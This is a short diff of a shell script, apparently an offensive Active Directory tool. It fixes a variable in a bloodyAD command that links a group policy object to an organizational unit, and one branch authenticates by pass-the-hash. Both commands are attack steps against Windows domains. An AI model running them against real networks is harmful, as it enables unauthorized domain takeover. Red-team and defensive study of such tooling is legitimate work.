@@ -26,7 +26,7 @@ case "$target_opt" in
     if [ -n "$(echo $password | grep -Eo '[0-9a-fA-F]{32}')" ]
     then
       # Pass the Hash
-      bloodyAD -d $domain --host $target_ip -u $user -p aad3b435b51404eeaad3b435b51404ee:$password set object "OU=$target_detail,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
+      bloodyAD -d $domain --host $target_ip -u $user -p aad3b435b51404eeaad3b435b51404ee:$password set object "OU=$target_opt,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
     else
       bloodyAD -d $domain --host $target_ip -u $user -p $password set object "OU=$target_opt,DC=$domain_prefix,DC=$domain_suffix" GPLink -v "[LDAP://$gpo_ldap_query;0]"
     fi
